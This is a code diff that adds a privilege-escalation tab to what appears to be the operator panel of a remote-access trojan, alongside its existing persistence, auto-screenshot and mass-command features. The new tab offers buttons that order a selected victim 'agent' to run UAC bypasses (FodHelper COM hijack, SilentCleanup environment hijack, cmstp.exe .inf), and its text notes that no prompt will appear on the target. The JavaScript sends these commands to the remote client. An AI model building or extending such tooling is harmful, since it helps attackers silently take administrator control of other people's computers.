@@ -292,6 +292,7 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
       <button class="tab-btn" data-tab="autoshots">AUTO-SS</button>
       <button class="tab-btn" data-tab="chat">CHAT</button>
       <button class="tab-btn" data-tab="persist">PERSIST</button>
+      <button class="tab-btn" data-tab="privesc" style="color:var(--warn);">⚡ PRIVESC</button>
     </div>
     <div class="modal-body">
 
@@ -483,6 +484,27 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
             <button class="btn btn-red" onclick="persistRemove()">✕ REMOVE AUTOSTART</button>
           </div>
           <div id="persist-result" style="font-size:12px;color:var(--dim);"></div>
+        </div>
+      </div>
+
+      <!-- PRIVESC -->
+      <div class="tab-content" id="tab-privesc">
+        <div class="persist-area">
+          <div style="margin-bottom:16px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
+            <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚡ PRIVILEGE ESCALATION</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Attempts to relaunch the agent as Administrator using UAC bypass techniques. No UAC prompt will appear on the target.<br><br>
+              <span style="color:var(--accent2);">Method 1 — FodHelper:</span> Hijacks the fodhelper.exe COM registry key to auto-elevate (Windows 10/11).<br>
+              <span style="color:var(--accent2);">Method 2 — SilentCleanup:</span> Abuses the SYSTEM-level DiskCleanup scheduled task via env var hijack.<br>
+              <span style="color:var(--accent2);">Method 3 — cmstp.exe:</span> Uses CM shell .inf auto-execute to spawn an elevated process.
+            </div>
+          </div>
+          <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
+            <button class="btn btn-warn" onclick="privescRun('fodhelper')">🪟 FODHELPER</button>
+            <button class="btn btn-warn" onclick="privescRun('silentcleanup')">🧹 SILENTCLEANUP</button>
+            <button class="btn btn-warn" onclick="privescRun('cmstp')">📋 CMSTP</button>
+            <button class="btn btn-blue btn-sm" onclick="privescCheckAdmin()">? CHECK ADMIN</button>
+          </div>
+          <div id="privesc-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
       </div>
 
@@ -1182,6 +1204,27 @@ async function persistRemove(){
   document.getElementById('persist-result').textContent='Removing...';
   const res=await sendCmdRaw('persist_remove');
   document.getElementById('persist-result').innerHTML=`<span style="color:${res.status==='ok'?'var(--accent)':'var(--warn)'}">${esc(res.msg)}</span>`;
+}
+
+// ── Privesc ──
+function _privescLog(msg, color){
+  const el=document.getElementById('privesc-result');
+  const time=new Date().toTimeString().slice(0,8);
+  el.innerHTML+=`<span style="color:var(--dim)">[${time}]</span> <span style="color:${color||'var(--text)'}">${esc(msg)}</span>\n`;
+  el.scrollTop=el.scrollHeight;
+}
+async function privescCheckAdmin(){
+  if(!selectedClient) return;
+  _privescLog('Checking privileges...','var(--dim)');
+  const res=await sendCmdRaw('privesc_check');
+  _privescLog(res.msg, res.is_admin?'var(--accent)':'var(--warn)');
+}
+async function privescRun(method){
+  if(!selectedClient) return;
+  const labels={'fodhelper':'FodHelper','silentcleanup':'SilentCleanup','cmstp':'cmstp.exe'};
+  _privescLog(`Attempting ${labels[method]||method} bypass...`,'var(--accent2)');
+  const res=await sendCmdRaw('privesc_run',{method});
+  _privescLog(res.msg, res.status==='ok'?'var(--accent)':'var(--warn)');
 }
 
 // ── Mass Command ──
